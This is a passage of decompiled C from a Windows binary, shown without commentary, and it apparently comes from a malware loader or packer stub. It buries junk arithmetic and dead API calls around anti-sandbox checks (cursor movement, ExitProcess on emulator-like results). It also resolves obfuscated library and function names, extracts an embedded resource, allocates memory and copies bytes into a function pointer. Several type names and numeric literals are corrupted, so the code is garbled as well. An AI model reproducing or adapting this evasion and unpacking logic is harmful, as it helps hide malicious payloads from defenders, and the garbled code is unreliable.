[ebp-1CB0h]\n  int v395; // [esp+7F0h] [ebp-1CACh]\n  int v396; // [esp+7F4h] [ebp-1CA8h]\n  int v397; // [esp+7F8h] [ebp-1CA4h]\n  int v398; // [esp+7FCh] [ebp-1CA0h]\n  int v399; // [esp+800h] [ebp-1C9Ch]\n  int v400; // [esp+804h] [ebp-1C98h]\n  int v401; // [esp+808h] [ebp-1C94h]\n  int v402; // [esp+80Ch] [ebp-1C90h]\n  int v403; // [esp+810h] [ebp-1C8Ch]\n  int v404; // [esp+814h] [ebp-1C88h]\n  int v405; // [esp+818h] [ebp-1C84h]\n  int v406; // [esp+81Ch] [ebp-1C80h]\n  int v407; // [esp+820h] [ebp-1C7Ch]\n  int v408; // [esp+824h] [ebp-1C78h]\n  int v409; // [esp+828h] [ebp-1C74h]\n  struct tagRECT Rect; // [esp+82Ch] [ebp-1C70h] BYREF\n  int v411; // [esp+83Ch] [ebp-1C60h]\n  int v412; // [esp+840h] [ebp-1C5Ch]\n  int v413; // [esp+844h] [ebp-1C58h]\n  int v414; // [esp+848h] [ebp-1C54h]\n  int v415; // [esp+84Ch] [ebp-1C50h]\n  int v416; // [esp+850h] [ebp-1C4Ch]\n  int v417; // [esp+854h] [ebp-1C48h]\n  int v418; // [esp+858h] [ebp-1C44h]\n  struct tagRECT v419; // [esp+85Ch] [ebp-1C40h] BYREF\n  TIME_ZONE_IND82DATION TimeZoneInformation; // [esp+86Ch] [ebp-1C30h] BYREF\n  int v421; // [esp+91Ch] [ebp-1B80h]\n  int v422; // [esp+92Ch] [ebp-1B70h]\n  struct tagRECT v423; // [esp+93Ch] [ebp-1B60h] BYREF\n  struct tagPA2B51TRUCT Paint; // [esp+94Ch] [ebp-1B50h] BYREF\n  PA2B51TRUCT v425; // [esp+98Ch] [ebp-1B10h] BYREF\n  int v426; // [esp+9D0h] [ebp-1ACCh]\n  int v427; // [esp+A0Ch] [ebp-1A90h]\n  SH2A4BINFOW psfi; // [esp+ABCh] [ebp-19E0h] BYREF\n  struct _TR85F2TEX pVertex; // [esp+D78h] [ebp-1724h] BYREF\n  CHAR String[20]; // [esp+D98h] [ebp-1704h] BYREF\n  _DWORD v431[64]; // [esp+DACh] [ebp-16F0h] BYREF\n  char v432[256]; // [esp+EACh] [ebp-15F0h] BYREF\n  _DWORD FileName[130]; // [esp+FACh] [ebp-14F0h] BYREF\n  CHAR szVer[80]; // [esp+11B4h] [ebp-12E8h] BYREF\n  CHAR szName[80]; // [esp+1204h] [ebp-1298h] BYREF\n  char Format[776]; // [esp+1254h] [ebp-1248h] BYREF\n  __int16 v437[260]; // [esp+155Ch] [ebp-F40h] BYREF\n  __int16 v438[520]; // [esp+1764h] [ebp-D38h] BYREF\n  SQ805BR szConnStrOut[264]; // [esp+1B74h] [ebp-928h] BYREF\n  SQ805BR szConnStrIn; // [esp+1C7Ch] [ebp-820h] BYREF\n  char v441[1031]; // [esp+1C7Dh] [ebp-81Fh] BYREF\n  char Buffer[1028]; // [esp+2084h] [ebp-418h] BYREF\n  int v443; // [esp+2498h] [ebp-4h]\n\n  dword_35B29748 = dword_3536FFD8\n                 - dword_35BD33E4\n                 - dword_358FD864 * (_DWORD)::hDlg * (dword_35B29748 / ((int)hMenu + 98));\n  nIDButton = dword_358FD864\n            + nIndex * (unsigned __int8)dword_35BD33D8\n            + (unsigned __int8)dword_35BD33F0\n            - dword_358FD868 * dword_35BD33E4;\n  if ( dword_3536FFDC + (int)nIndex / (::hDC + 63) <= (unsigned __int8)dword_358FD868 )\n    dword_35BD33E4 += dword_3536FFD8\n                    + dword_35BD33F4 * (unsigned __int16)dword_3536FFDC / 17\n                    + nIndex * (dword_35BD33D8 / (dword_35BD33E0 + 80));\n  else\n    dword_35B29748 = dword_35BD33E0 + dword_3536FFD8 - (unsigned __int16)dword_35BD33E4;\n  if ( (int)dword_358FD894 <= (int)nIDButton )\n    nIDButton = dword_35BD33E0 * (unsigned __int8)dword_3536FFD8;\n  else\n    dword_3536FFD8 += (int)hMenu + (_DWORD)dword_358FD894;\n  dword_35BD33F4 += (int)::hDlg\n                  + nIndex\n                  - (int)hInternet / 32\n                  - (int)nIDButton / (::hDC + 56)\n                  + dword_35B29748 * dword_35BD33F4;\n  if ( (unsigned __int16)dword_35BD33E4 + (unsigned __int8)dword_358FD894 )\n    dword_35B29748 = (_DWORD)nIDDlgItem * dword_35B29748 * dword_3536FFD8 + (int)hInternet / ((int)dword_358FD894 + 50);\n  v215 = 0;\n  v162 = 1;\n  v154 = 0;\n  v86 = (unsigned int)hModule;\n  v38 = 0;\n  v71 = 1;\n  v293 = 1;\n  v335 = 0;\n  memset(&Format[520], 0, 256);\n  v406 = 0;\n  v407 = 0;\n  v408 = 0;\n  v409 = 0;\n  v402 = 0;\n  v403 = 0;\n  v404 = 0;\n  v405 = 0;\n  v415 = 0;\n  v416 = 0;\n  v417 = 0;\n  v418 = 0;\n  memset(v438, 0, 520);\n  nIndex = (unsigned __int8)nIDDlgItem + (unsigned __int16)dword_35BD33D4;\n  sub_359A9D20(v279);\n  v443 = 0;\n  v56 = 1;\n  sub_35EDD300(v279, &v56);\n  hHandle = CreateEventA(0, 0, 0, \"svet\");\n  v87 = 0;\n  v104 = 0;\n  Point.x = 0;\n  Point.y = 0;\n  v129.x = 0;\n  v129.y = 0;\n  nIDButton += (DWORD)hInternet\n             + v86\n             - (int)((_DWORD)v438 * nIDButton * (unsigned __int8)TableName) / ((int)hInternet + 50);\n  GetCursorPos(&Point);\n  for ( i = 0; i < 10; ++i )\n  {\n    if ( (int)hMenu - (unsigned __int8)dword_353E0F18 < (int)dword_358FD894 )\n    {\n      v156 = v154;\n      v1 = *(double *)_libm_sse2_log_precise().m128_u64;\n      v160 = v71;\n      dword_358FD868 = (int)(v1 / 14.0 + (double)v71);\n    }\n    v216 = v280;\n    if ( v280 )\n    {\n      v218 = (float)dword_358FD864;\n      v2 = *(double *)_libm_sse2_exp_precise().m128_u64;\n      v220 = v2;\n      v353 = v2;\n      v294 = v2 - *(double *)_libm_sse2_asin_precise().m128_u64 / 37.0 - (double)dword_358FD858;\n      v222 = v73 | 0xC00;\n      v295 = (__int64)v294;\n      v162 = (__int64)v294;\n    }\n    else\n    {\n      v406 = (int)dword_358FD894 + v71 - v402 / 15;\n    }\n    GetCursorPos(&v129);\n    hdc = (HDC)::hDC;\n    SetBkMode((HDC)::hDC, 1);\n    SetTextColor(hdc, 0xFFu);\n    if ( Point.x == v129.x && Point.y == v129.y )\n    {\n      pwcsName = 0;\n      StgOpenStorage(&pwcsName, 0, 0x10002u, 0, 0, &ppstgOpen);\n    }\n    else\n    {\n      if ( v86 < (unsigned int)nIDDlgItem )\n        v86 -= (unsigned int)::hDlg\n             + dword_35BD33E4\n             + dword_358FD858 / ((int)hInternet + 70)\n             + (unsigned __int8)hInternet\n             + (unsigned __int16)&pszPath / 16\n             - v86 * v38;\n      else\n        v38 *= v38 + (unsigned __int8)v71;\n      ++v87;\n      Point = v129;\n    }\n    if ( v87 )\n    {\n      hdbc = 0;\n      *(_DWORD *)pcchConnStrOut = hInternet;\n      p_szConnStrIn = &szConnStrIn;\n      v224 = v441;\n      p_szConnStrIn += strlen((const char *)p_szConnStrIn);\n      v231 = ++p_szConnStrIn - (SQ805BR *)v441;\n      v352[5] = SQLDriverConnect(\n                  0,\n                  0,\n                  &szConnStrIn,\n                  (_WORD)p_szConnStrIn - (unsigned __int16)v441,\n                  szConnStrOut,\n                  512,\n                  pcchConnStrOut,\n                  0);\n      ++v104;\n    }\n    if ( v87 > v71 )\n      break;\n    VirtualAddress = 0;\n    NumberOfPages = ((::hDC + 2) << 20) / 4096;\n    v235 = (PU1183_PTR)operator new[](4 * NumberOfPages);\n    PageArray = v235;\n    MapUserPhysicalPages(VirtualAddress, NumberOfPages, v235);\n    if ( v104 == v71 + 4 )\n    {\n      if ( nIndex + dword_35BD33E0 >= v38 )\n        v38 *= dword_35BD33F0 + (unsigned __int8)dword_358FD858;\n      break;\n    }\n    WaitForSingleObject(hHandle, v38 + v71 + 2999);\n  }\n  v214 = (int **)sub_357A2740(v279, v361);\n  phProv[1] = (HC3994PROV)v214;\n  LOCD9A(v443) = 1;\n  v225 = (unsigned __int8 *)sub_35FFB760(v214);\n  LOCD9A(v443) = 0;\n  v181 = *v225;\n  v302 = &v181;\n  v55 = dword_35BD33E4;\n  sub_35EDD300(v279, &v55);\n  sub_35BF1C40(v279);\n  v114 = 75;\n  do\n  {\n    if ( dword_35BD33E4 )\n    {\n      v168 = v38;\n      v297 = (double)(int)hMenu;\n      v3 = *(double *)_libm_sse2_log_precise().m128_u64;\n      v170 = dword_35BD33E4;\n      v299 = (double)(unsigned int)dword_35BD33E4 - v297 * v3;\n      v227 = v76 | 0xC00;\n      v301 = (__int64)v299;\n      dword_35BD33E4 = (__int64)v299;\n    }\n    FindResourceExA(hModule, \"CODE\", \"MY1396\", 0);\n    --v114;\n  }\n  while ( v114 );\n  v443 = -1;\n  sub_359A9DA0(v279);\n  v133 = 0;\n  v337 = 0;\n  v92 = hModule;\n  v172 = 0;\n  v90 = 1;\n  v304 = 1;\n  v351 = 0;\n  v378 = 0;\n  v379 = 0;\n  v380 = 0;\n  v381 = 0;\n  v370 = 0;\n  v371 = 0;\n  v372 = 0;\n  v373 = 0;\n  v374 = 0;\n  v375 = 0;\n  v376 = 0;\n  v377 = 0;\n  memset(&v441[511], 0, 520);\n  hWnd = FindWindowA(TableName, TableName);\n  dwProcessId = ::hDC * (_DWORD)nIDDlgItem;\n  GetWindowThreadProcessId(hWnd, &dwProcessId);\n  v51 = 1 - (v378 / 38 + (unsigned __int8)nIDButton - v380 - v377 / 33 - v90 - (unsigned __int8)::hDC);\n  pdblOut = 0.0;\n  ::hDlg = (HWND)VarR8FromI4(0, &pdblOut);\n  sub_359A9D20(v267);\n  v443 = 2;\n  v63 = nIndex;\n  sub_35FF8DB0(v267, &v63);\n  v57 = dword_35BD33E4;\n  sub_35FF8DB0(v267, &v57);\n  if ( v371 == v381 )\n    v92 = (HM905FE)((char *)v92 + v381 + v370 + v133 + ::hDC * dword_35BD33E0 * (unsigned __int16)v92 - v372);\n  else\n    v371 = dword_358FD864;\n  BYTE2(v65) = v90;\n  sub_35EDD300(v267, (_BYTE *)&v65 + 2);\n  v59 = (char)nIDDlgItem;\n  sub_35EDD300(v267, &v59);\n  nIDButton += (DWORD)v92 + ::hDC / 31 - (unsigned __int8)hMenu / 10;\n  v51 = dword_35BD33D8 * dword_35BD33D4 * nIDButton;\n  v371 = v51 + (unsigned __int8)dword_35BD33D4 - v374 / 24;\n  LOCD9A(v65) = 20;\n  sub_359A9DE0(v267, 7u, &v65);\n  nIndex = (unsigned __int16)dword_358FD864\n         + nIDButton\n         + (unsigned __int8)nIndex * (unsigned __int8)dword_35BD33F0\n         + (unsigned __int16)v172\n         - v51;\n  pvIn = (LPCAE2)malloc(9u);\n  Escape(nIDDlgItem, 19, 5, pvIn, 0);\n  if ( SHGetDesktopFolder(&ppshf) >= 0 )\n    nIndex = (UINT)hInternet + 2;\n  dword_358FD894 = (HWND)VarR8FromR4(0.0, &pdblOut);\n  if ( v90 * ((unsigned __int16)v377 / (dword_35BD33E0 + 97)) )\n    v379 = (unsigned __int8)v377;\n  else\n    dword_358FD868 = dword_35BD33D4 - (unsigned __int8)dword_35BD33E0 - v374 * v172 / 0x2Du - (unsigned __int8)v133;\n  for ( j = 0; j < 26; ++j )\n  {\n    if ( dword_358FD864 - (unsigned __int16)dword_35BD33E0 == v374 )\n      v51 += v374 + (unsigned __int8)nIDDlgItem - dword_358FD864;\n    else\n      v373 += (int)nIDDlgItem + v379 + (_DWORD)dword_358FD894 * v90 - dword_35BD33F0;\n    pavi = 0;\n    if ( ::hDlg )\n      AVIStreamGetFrameOpen(pavi, 0);\n  }\n  v443 = -1;\n  sub_35E832E0((int)v267);\n  sub_35F388C0(v267);\n  nLengthNeeded = 0;\n  v69 = 1;\n  v108 = 0;\n  v240 = hModule;\n  nLength = 0;\n  v94 = 0;\n  KernelObjectSecurity = 2;\n  FileSecurityA = 2;\n  v167 = 2;\n  v339 = 0;\n  v308 = 10;\n  memset(&Format[264], 0, 256);\n  v411 = 0;\n  v412 = 0;\n  v413 = 0;\n  v414 = 0;\n  v382 = 0;\n  v383 = 0;\n  v384 = 0;\n  v385 = 0;\n  v390 = 0;\n  v391 = 0;\n  v392 = 0;\n  v393 = 0;\n  memset(v437, 0, sizeof(v437));\n  sub_35940F30(&v99);\n  v443 = 3;\n  v230 = 203;\n  v187 = 44;\n  v273[0] = 44;\n  v273[1] = 203;\n  v352[9] = *(_DWORD *)sub_35179490(&v99, (int)v355, (int)v273);\n  v189 = v100;\n  v155 = v100 == 0;\n  if ( v100 )\n  {\n    v232 = (float)(int)nIDButton;\n    v6 = *(double *)_libm_sse2_log10_precise().m128_u64;\n    v193 = v6;\n    v173 = 1;\n    v307 = (float)(v6 / 32.0);\n    v7 = *(double *)_libm_sse2_sqrt_precise().m128_u64;\n    v137 = nLengthNeeded;\n    v309 = v307 - v7 / (double)(dword_35BD33E0 + 56);\n    dword_358FD868 = (int)(v309 + *(double *)_libm_sse2_sin_precise().m128_u64);\n  }\n  else\n  {\n    v135 = dword_35BD33E4;\n    v303 = (double)(unsigned int)dword_35BD33E4;\n    v4 = (float)(unsigned int)dword_35BD33E4;\n    v254 = v4;\n    v305 = ceil(v4);\n    v5 = v305;\n    v191 = v5;\n    nIndex = (int)(float)(v5 - (float)(dword_358FD868 * (unsigned __int8)dword_358FD894));\n  }\n  for ( k = 0; k < (int)hMenu * (::hDC + 4); ++k )\n  {\n    v260 = v100;\n    v131 = v100 == 0;\n    if ( !v100 )\n    {\n      v195 = (float)(int)nIDDlgItem;\n      v8 = *(double *)_libm_sse2_log10_precise().m128_u64;\n      v234 = v8;\n      v311 = (double)v385;\n      v313 = floor((double)v385);\n      v139 = nLengthNeeded;\n      dword_358FD868 = (int)(v313 + v234 - (double)nLengthNeeded);\n    }\n    v123 = (__int16)::hDlg;\n    v121 = (__int16)::hDlg;\n    v241 = (__int16)::hDlg;\n    v242 = nLength;\n    v276 = (__int16)::hDlg;\n    v277 = nLength;\n    v310 = *(_DWORD *)sub_35179490(&v99, (int)v359, (int)&v276);\n    v244 = dword_35BD33E0;\n    v245 = v69;\n    v271[0] = dword_35BD33E0;\n    v271[1] = v69;\n    v341 = *(_DWORD *)sub_35179490(&v99, (int)v358, (int)v271);\n    FileSecurityA = GetFileSecurityA(0, 0, 0, nLength, &nLengthNeeded);\n    v197 = (float)dword_35BD33E0;\n    v9 = *(double *)_libm_sse2_cos_precise().m128_u64;\n    v256 = v9;\n    v157 = 1;\n    v315 = (double)1u;\n    v10 = (float)1u;\n    v141 = (unsigned __int8)TableName * (nLengthNeeded / (::hDC + 75));\n    v317 = (double)v141;\n    v11 = (float)v141;\n    v199 = (float)((float)(v10 * v256) - (float)(unsigned __int16)dword_358FD894) + v11;\n    v236 = v82 | 0xC00;\n    v319 = (__int64)v199;\n    v69 = v319;\n    sub_3519EA60(&v99);\n    v391 = ::hDC\n         + dword_35BD33E0\n         + nLengthNeeded * (unsigned __int8)v391\n         + (unsigned __int8)dword_358FD864\n         + (unsigned __int16)v69\n         - v384 / ((int)dword_358FD894 + 55);\n    sub_359A9D20(v278);\n    LOCD9A(v443) = 4;\n    v61 = dword_35BD33F0;\n    sub_35A51310(v278, &v61);\n    v167 = nLength * GetInheritanceSourceA(0, ::hDC, 0, 0, 0, nLength, 0, 0, 0, 0);\n    v201 = (unsigned __int8 *)sub_357A27B0(v278);\n    v264 = *v201;\n    v312 = &v264;\n    v52 = dword_35BD33D4;\n    sub_35EDD300(v278, &v52);\n    if ( (unsigned __int16)v437 - v383 <= (int)nIndex )\n      nIDDlgItem = (HDC)::hDC;\n    else\n      v383 = (int)*(double *)_libm_sse2_asin_precise().m128_u64;\n    KernelObjectSecurity = GetKernelObjectSecurity((HA3759)nLength, 0, 0, ::hDC, &v69);\n    if ( (HDC)((char *)nIDDlgItem + 1 / ((unsigned int)dword_358FD894 + 65)) )\n      dword_358FD868 = nLength;\n    v54 = (char)hInternet;\n    sub_35EDD300(v278, &v54);\n    v45 = dword_358FD858;\n    sub_35A51310(v278, &v45);\n    if ( ::hDlg == (HWND)KernelObjectSecurity && (HIE2CANET)FileSecurityA == hInternet && (HWND)v167 == dword_358FD894 )\n    {\n      if ( (char *)hInternet - (unsigned __int16)dword_358FD858 == (char *)dword_358FD894 )\n      {\n        v145 = 1;\n        v321 = (double)1u;\n        v12 = *(double *)_libm_sse2_cos_precise().m128_u64;\n        v203 = v12;\n        v323 = (double)(int)hInternet;\n        v325 = v323\n             - *(double *)_libm_sse2_asin_precise().m128_u64 / 41.0\n             - (double)(int)nIDDlgItem\n             + (double)((int)dword_358FD894 / (::hDC + 64))\n             + (double)(unsigned __int16)dword_358FD858\n             + v12;\n        v238 = v84 | 0xC00;\n        v334 = (__int64)v325;\n        v108 = (__int64)v325;\n      }\n      else\n      {\n        v108 += (unsigned __int8)hInternet;\n      }\n      v94 = dword_35BD33D8;\n    }\n    else\n    {\n      ppstm = 0;\n      v352[1] = CreateStreamOnHGlobal(0, 0, &ppstm);\n      v94 = 0;\n    }\n    if ( ::hDC )\n    {\n      pMesh[0] = 0;\n      pMesh[1] = 0;\n      GradientFill((HDC)::hDC, &pVertex, 2u, pMesh, 1u, 0);\n    }\n    if ( nLength )\n    {\n      phContext = &v357;\n      if ( QueryContextAttributesA(&v357, 0x59u, pBuffer) )\n        nIDButton = nIndex;\n    }\n    if ( v94 )\n    {\n      for ( m = 0; m < (int)hInternet + 6; ++m )\n      {\n        v69 = (DWORD)hInternet\n            + v69\n            + (unsigned __int16)v240 / (dword_35BD33E0 + 58)\n            + dword_358FD864\n            - (unsigned __int16)dword_35BD33D8\n            + 1;\n        sub_359A9D20(v266);\n        LOCD9A(v443) = 5;\n        sub_35EB3470(v266, &::hDC);\n        v161 = *(_DWORD *)&v437[59] / 0x22u - (_DWORD)nIDDlgItem;\n        v147 = dword_35BD33E4;\n        v338 = (double)v161;\n        v336 = (double)((int)&pszPath / ((int)::hDlg + 94));\n        nIDDlgItem = (HDC)(int)((double)(int)nIDDlgItem\n                              - (v338\n                               - v336 * *(double *)_libm_sse2_sin_precise().m128_u64 / (double)((int)hInternet + 74)\n                               + (double)dword_358FD868));\n        sub_35EB3470(v266, &nIDDlgItem);\n        v209[0] = (int)dword_358FD894;\n        sub_35940F60(v266, v209);\n        v284 = (double)(dword_35BD33D8 / 22 + (unsigned __int16)&pszPath);\n        v13 = *(double *)_libm_sse2_log_precise().m128_u64;\n        v171 = nLengthNeeded;\n        v282 = v13 / (double)(dword_353E0F18 + 99);\n        nIDButton = (int)(v284 + v282 * *(double *)_libm_sse2_asin_precise().m128_u64);\n        nLength *= nLengthNeeded - 1;\n        sub_35EB3400(v266, v362);\n        sub_352D23C0((int)v266);\n        v94 = 0;\n        LOCD9A(v443) = 4;\n        sub_352D23C0((int)v266);\n        sub_35F388C0(v266);\n      }\n    }\n    else\n    {\n      bufptr = 0;\n      MessageBoxA(0, TableName, TableName, 0);\n      NetWkstaUserGetInfo(0, nIDButton, &bufptr);\n    }\n    LOCD9A(v443) = 3;\n    sub_359A9DA0(v278);\n  }\n  dword_358FD864 = (_DWORD)hInternet * dword_353E0F18 + 2;\n  if ( ::hDlg )\n  {\n    pvTypePara[0] = 3;\n    pCertContext = (PC214C_CO13CAT)&v363;\n    if ( hInternet )\n    {\n      if ( !hMenu && ::hDlg )\n        CertGetNameStringA(pCertContext, 2u, 0, pvTypePara, 0, 0);\n    }\n  }\n  if ( 1u / (::hDC + 53) != dword_358FD868 )\n  {\n    v286 = *(double *)_libm_sse2_sin_precise().m128_u64 * (double)(unsigned __int16)&pszPath - (double)dword_358FD858;\n    pvTypePara[2] = v78 | 0xC00;\n    v288 = (__int64)v286;\n    dword_35BD33E4 = (__int64)v286;\n  }\n  v443 = -1;\n  sub_35D6D3C0(&v99);\n  dword_3536FFD8 = dword_3536FFDC * (unsigned __int8)dword_35BD33D4\n                 + dword_35BD33F4\n                 + (unsigned __int16)dword_35BD33DC\n                 - nIDButton\n                 - (unsigned __int16)TableName;\n  if ( (int)(dword_358FD858\n           + (unsigned __int8)dword_35B29748\n           + (unsigned __int8)dword_3536FFD8 / (dword_35BD33E0 + 74)\n           - nIDButton) <= dword_358FD864 * (int)hMenu )\n    dword_3536FFD8 = (unsigned __int16)::hDC;\n  dword_3536FFD8 -= (int)dword_358FD894\n                  + dword_35BD33D8 / (::hDC + 52)\n                  + (_DWORD)hInternet\n                  + dword_35BD33F4 / ((int)hInternet + 74);\n  lpName = \"open\";\n  lpType = \"file\";\n  lpFileName = \"close\";\n  v14 = MulDiv(10, 96, 72);\n  hWndParent = (HWND)CreateFontW(-v14, 0, 0, 0, 400, 0, 0, 0, 0x80u, 0, 0, 0, 0, L\"MS Shell Dlg\");\n  v34 = hWndParent != 0;\n  ModuleHandleA = GetModuleHandleA(0);\n  hDlg = CreateWindowExA(0, \"BU1594\", \"Id\", 0x50456700u, 0, 0, 0, 0, hWndParent, (HMENU)1, ModuleHandleA, 0);\n  if ( hDlg )\n    v35 = v34 + 16;\n  else\n    v35 = ::hDC + v34;\n  wParam = v35 - 0x484792089E84FE2Di64;\n  lParam = 0x3151ABA72EC9A7D6i64 - v35 + 1;\n  v247 = 0xF3AF3127C88D9233ui64 * v35;\n  v249 = 0x2FACF27D2C8861Ei64;\n  v174 = 55i64;\n  v159 = 30CF1757i64;\n  Msg = v35;\n  v265 = v35 + 8;\n  v268 = 22CFF8;\n  v269 = 0;\n  v253 = SendMessageA(hDlg, 0x30u, (WP0CFA)hWndParent, 0);\n  v251 = v247 * v35 + wParam * lParam;\n  v263 = v249 * v35 + wParam * lParam;\n  v255 = Msg * v35 + v174 * v159;\n  lpLibFileName = (LPCAE2)GlobalAlloc(0x40u, 0x20u);\n  if ( v253 )\n    ExitProcess(0);\n  *(_QWORD *)lpLibFileName = v251;\n  LibraryA = LoadLibraryA(lpLibFileName);\n  v211 = EnableWindow(hDlg, 0);\n  lpProcName = (LPCAE2)GlobalAlloc(0x40u, 0x20u);\n  if ( v211 )\n    ExitProcess(0);\n  *(_QWORD *)lpProcName = v263;\n  DefDlgProcA(hDlg, Msg, wParam, lParam);\n  hResInfo = FindResourceA(0, lpName, lpType);\n  if ( !hResInfo )\n  {\n    v16 = lpProcName;\n    *((_DWORD *)lpProcName + 2) = v255;\n    *((_DWORD *)v16 + 3) = 0;\n  }\n  nNumberOfBytesToWrite = SizeofResource(0, hResInfo);\n  hResData = LoadResource(0, hResInfo);\n  lpBuffer = LockResource(hResData);\n  hFile = CreateFileA(lpFileName, 0x405C5F00u, 0, 0, 3u, 0x80u, 0);\n  if ( hFile == (HA3759)-1 )\n    ProcAddress = GetProcAddress(LibraryA, lpProcName);\n  else\n    *(_DWORD *)hInternet = v159;\n  if ( WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )\n    *(_DWORD *)hInternet = v159;\n  else\n    dword_358FD858 = ((int (__stdcall *)(_DWORD, int, int, _DWORD))ProcAddress)(0, v268, 12288, v174 + v265);\n  CloseHandle(hFile);\n  dword_3536FFD0 -= dword_35BD33DC - dword_3536FFCC * ((int)nIDDlgItem / (dword_353E0F18 + 90));\n  nIDButton = (char *)nIDDlgItem\n            + nIndex\n            + (unsigned __int8)dword_358FD868 / ((int)::hDlg + 51)\n            + (unsigned __int16)dword_35BD33E4 / (::hDC + 57)\n            + (unsigned __int8)dword_35BD33D8\n            - (_BYTE *)hInternet;\n  dword_3536FFD8 -= (_DWORD)hInternet * (_DWORD)hMenu * (dword_358FD868 / ((int)hInternet + 78));\n  v70 = 0;\n  v46 = 1;\n  v43 = 0;\n  v44 = hModule;\n  v72 = 0;\n  v223 = 0;\n  v103 = 3;\n  v151 = 1;\n  v64 = 1;\n  v169 = 0;\n  v153 = 0;\n  v259 = dword_358FD894;\n  v163 = 1;\n  v107 = dword_358FD894;\n  v188 = ::hDC;\n  v186 = (WP0CFA)nIDDlgItem;\n  v184 = dword_358FD868;\n  v367 = 0;\n  v369 = hInternet;\n  v368 = (int)hInternet + (_DWORD)hMenu;\n  v37 = BeginPaint(dword_358FD894, &Paint);\n  SaveDC(v37);\n  memset(v176, 0, sizeof(v176));\n  v443 = 6;\n  if ( (unsigned int)v37 < ::hDC )\n  {\n    if ( v64 < ::hDC + v64 )\n      dword_358FD868 = v64 + v46;\n    if ( ::hDlg )\n      nIDButton = ::hDC;\n    v360 = 180 * GetDeviceCaps(v37, 90) / 72;\n    v366 = (int)nIDDlgItem + dword_358FD864 * dword_35BD33E4;\n  }\n  else\n  {\n    if ( (int)(nIDButton + 5) <= (int)::hDlg + 22 )\n      v43 = dword_358FD868;\n    else\n      nIDDlgItem = (HDC)(nIndex * dword_358FD868 - dword_35BD33E4);\n    v365 = dword_358FD858 + v163 - ((_DWORD)::hDlg + v64);\n  }\n  if ( v103 == v151 )\n  {\n    if ( v163 <= v103 )\n      dword_358FD868 = ((unsigned int)v44 + v43 - nIDButton) / (::hDC + 1);\n    else\n      nIndex = 0;\n  }\n  else\n  {\n    nIDDlgItem = (HDC)(nIDButton + (::hDC + 1) * nIndex * (398 - ::hDC));\n    dword_35BD33EC = (int (*)(void))(v367 + v365 - v366 * (_DWORD)v369);\n  }\n  v343 = 0;\n  v316 = 0;\n  v352[7] = 0;\n  v318 = 0;\n  v345 = 1;\n  v221 = EnableMenuItem(hMenu, nIndex, (UINT)nIDDlgItem);\n  *(_DWORD *)&pszPath = 0;\n  dword_35AD31BC = 0;\n  dword_35AD31C0 = 0;\n  dword_35AD31C4 = 0;\n  dword_35AD31C8 = 0;\n  if ( ::hDC )\n    SHGetFileInfoW(&pszPath, 0, &psfi, 0x2B4u, 0x4000u);\n  if ( v221 == -1 )\n  {\n    dword_358FD864 += (int)hInternet;\n  }\n  else\n  {\n    dword_358FD864 += nIDButton;\n    hMenu = 0;\n  }\n  DeviceCaps = GetDeviceCaps(v37, 90);\n  h = CreateFontA(\n        -(int)(fabs((double)(720 * DeviceCaps / 16)) / 16.0 + 0.2),\n        0,\n        0,\n        0,\n        500,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        \"font\");\n  v165 = 214;\n  if ( h >= v259 )\n  {\n    v18 = SelectObject(v37, h);\n    DeleteObject(v18);\n    nIDDlgItem = (HDC)(dword_358FD868\n                     + v43\n                     + dword_35BD33E4\n                     + v165 * (_DWORD)((char *)::hDlg - dword_358FD864 + 100)\n                     - (100\n                      - 8 * nIndex));\n    v72 = v368 * v103 * v64 + dword_358FD864 + 1;\n    RestoreDC(v37, -1);\n  }\n  else\n  {\n    SelectObject(v37, h);\n    v70 += nIndex * ((_DWORD)hInternet + v72 + 1);\n    nIndex += (UINT)nIDDlgItem + 1;\n    TextOutA(v37, 100, 100, \"\u0421\", 2);\n  }\n  for ( n = 0; n < v72; ++n )\n  {\n    if ( n * v169 == v151 )\n      sub_35247000(v176);\n    else\n      sub_35CCA5F0(v176, &byte_35EEE328[n]);\n  }\n  GetTextExtentPoint32A(v37, \"Te\", 7, &psizl);\n  if ( v223 )\n  {\n    for ( ii = 0; ii <= v72 + 8; ++ii )\n    {\n      if ( ii > v169 + ::hDC )\n        nIDDlgItem = (HDC)((_DWORD)::hDlg * dword_358FD864 + v70 * dword_358FD868);\n      if ( nIndex )\n        dword_358FD868 = (int)nIDDlgItem - dword_358FD868;\n      v43 *= (_DWORD)nIDDlgItem + 4 - dword_358FD868 * ::hDC;\n    }\n  }\n  else\n  {\n    for ( jj = 0; jj < v72; ++jj )\n    {\n      BYTE1(v65) = *(_BYTE *)sub_35CCA5D0(v176, jj);\n      nIDDlgItem = (HDC)((char *)nIDDlgItem + 3 * ((_DWORD)hMenu + nIDButton) + ::hDC);\n      *((_BYTE *)dword_35BD33EC + jj) = BYTE1(v65);\n      nIDButton = dword_35BD33E0 * ((_DWORD)hInternet + ::hDC + 1);\n    }\n  }\n  if ( (unsigned int)v44 + v46 <= v153 + v70 )\n  {\n    nIndex = (UINT)::hDlg;\n    nIDDlgItem = (HDC)((char *)nIDDlgItem + 3 * ((_DWORD)hMenu + nIDButton) + ::hDC);\n    v44 = (HM905FE)((char *)v44 + dword_358FD868 * ((_DWORD)hInternet + 1));\n    v19 = wsprintfA(String, \"%d\", psizl.cx);\n    TextOutA(v37, 20, 20, String, v19);\n  }\n  else\n  {\n    do\n    {\n      v46 *= (_DWORD)nIDDlgItem + 4 - dword_358FD868 * ::hDC;\n      v97 = v165 + dword_358FD864;\n      v91 = dword_35BD33EC;\n      v178 = v72;\n      v60 = 0;\n      v62 = 0;\n      memset((char *)v431 + 1, 0, 0xFFu);\n      v431[0] = dword_35BD33E0;\n      memset((char *)FileName + 2, 0, 0x206u);\n      v326 = hInternet;\n      v327 = 0;\n      v328 = 0;\n      v329 = 0;\n      v330 = 0;\n      v331 = 0;\n      v332 = 0;\n      v333 = 0;\n      v320 = hInternet;\n      v352[3] = dword_35BD33E0;\n      v322 = 512;\n      v347 = hInternet;\n      FileName[0] = dword_35BD33E0;\n      v324 = nIDButton;\n      v352[2] = (int)hInternet;\n      v102 = hInternet != 0;\n      v352[4] = 0;\n      v281[0] = (int)hInternet;\n      memset(&v281[1], 0, 16);\n      v352[6] = (int)v281;\n      memset(&TimeZoneInformation, 0, sizeof(TimeZoneInformation));\n      TimeZoneInformation.Bias = v427 + 60;\n      sub_35945F50(TimeZoneInformation.StandardName, 32, FileName);\n      TimeZoneInformation.StandardDate.wMonth = 10;\n      TimeZoneInformation.StandardDate.wDayOfWeek = 0;\n      